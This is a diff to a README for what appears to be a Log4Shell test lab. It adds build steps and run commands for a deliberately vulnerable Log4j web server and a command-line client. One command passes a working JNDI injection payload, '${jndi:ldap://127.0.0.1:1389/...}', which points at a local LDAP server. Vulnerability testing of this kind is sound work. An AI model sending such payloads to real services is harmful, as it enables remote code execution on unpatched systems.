@@ -30,3 +30,13 @@ line program that will write an error log for whatever the 1st param passed in i
 
 The other is a basic web server that will write an error log using the log_me
 header information.  Note this should be run in an isolated controlled env.
+
+#### To build the clients :
+navigate to the clients dir and run  ./build_clients.sh
+
+#### To execute the webserver : 
+from the clients dir run : java -cp target/l4sclients-1.0-SNAPSHOT-all.jar Log4jWebServer [Port_number]
+
+#### To execute the cmd line : 
+from the clients dir run : java -cp target/l4sclients-1.0-SNAPSHOT-all.jar Log4jCmdLine '${jndi:ldap://127.0.0.1:1389/#MM_127_0_0_1_4444}'
+
